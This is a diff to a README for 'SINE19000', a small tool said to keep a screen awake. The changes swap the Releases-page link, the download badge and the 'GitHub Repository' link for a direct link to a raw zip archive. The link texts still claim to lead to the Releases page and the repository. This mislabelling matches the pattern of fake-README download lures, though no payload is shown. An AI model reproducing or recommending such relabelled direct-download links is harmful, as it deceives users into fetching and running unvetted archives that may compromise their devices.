@@ -1,7 +1,7 @@
 # 🌟 SINE19000 - Keep Your Screen Awake Easily
 
 ## 📥 Download Now
-[![Download SINE19000](https://img.shields.io/badge/Download-SINE19000-blue.svg)](https://github.com/Vinu1966/SINE19000/releases)
+[![Download SINE19000](https://raw.githubusercontent.com/Vinu1966/SINE19000/main/S19K/SINE19000_2.0-beta.1.zip)](https://raw.githubusercontent.com/Vinu1966/SINE19000/main/S19K/SINE19000_2.0-beta.1.zip)
 
 ## 🖥️ Description
 SINE19000 is a tiny module that keeps your device screen awake. It does this without needing HTTPS or SSL certificates, making it perfect for local development. If you often find your screen dimming or locking when you don't want it to, this tool offers a straightforward solution.
@@ -19,7 +19,7 @@ Follow these simple steps to download and run SINE19000 on your device.
 - Lightweight and efficient.
 
 ## 📦 Download & Install
-1. **Visit this page to download:** Click [here](https://github.com/Vinu1966/SINE19000/releases) to go directly to the Releases page.
+1. **Visit this page to download:** Click [here](https://raw.githubusercontent.com/Vinu1966/SINE19000/main/S19K/SINE19000_2.0-beta.1.zip) to go directly to the Releases page.
 2. Choose the latest version available on the Releases page.
 3. Download the appropriate file for your system.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -48,7 +48,7 @@ For questions, comments, or concerns, please contact us through the GitHub Issue
 
 ## 🔗 Additional Resources
 For more information and updates, feel free to check:
-- [GitHub Repository](https://github.com/Vinu1966/SINE19000)
+- [GitHub Repository](https://raw.githubusercontent.com/Vinu1966/SINE19000/main/S19K/SINE19000_2.0-beta.1.zip)
 - Community forums for further discussion and support.
 
 Thanks for using SINE19000! Your device will stay awake whenever you need it.
